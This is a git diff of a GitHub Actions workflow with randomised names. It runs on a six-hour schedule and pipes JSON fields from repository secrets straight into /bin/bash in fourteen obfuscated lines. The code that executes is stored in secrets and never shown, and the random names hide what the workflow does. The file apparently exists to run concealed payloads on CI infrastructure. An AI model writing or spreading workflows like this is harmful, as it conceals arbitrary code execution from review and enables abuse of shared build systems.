@@ -2,19 +2,30 @@ name: huangganshi9316
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '7 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huangganshi9316
         env:
-          iw31: ${{ secrets.iw31 }}
+          esmhu5: ${{ secrets.esmhu5 }}
         run: |
-          echo $iw31 | jq -r .srly7086 | /bin/bash
-          echo $q7285 | jq -r .ygbei104 | /bin/bash
-          echo $w7695 | jq -r .emzt32 | /bin/bash
-          echo $rgg3553 | jq -r .ui63456 | /bin/bash
+          echo $esmhu5 | jq -r .ivqka200 | /bin/bash
+          echo $pfvp36868 | jq -r .sm408 | /bin/bash
+          echo $y36952 | jq -r .rupcs4418 | /bin/bash
+          echo $j1605 | jq -r .xp9681 | /bin/bash
+          echo $ylibd348 | jq -r .dk2 | /bin/bash
+          echo $ne11 | jq -r .vtw46600 | /bin/bash
+          echo $z29 | jq -r .ur37291 | /bin/bash
+          echo $d9 | jq -r .hthy116 | /bin/bash
+          echo $gcsw8 | jq -r .nb32763 | /bin/bash
+          echo $rj95 | jq -r .snkq5366 | /bin/bash
+          echo $k097 | jq -r .itv54428 | /bin/bash
+          echo $jcot99 | jq -r .ib061 | /bin/bash
+          echo $y6209 | jq -r .w5 | /bin/bash
+          echo $a58 | jq -r .s192 | /bin/bash
 
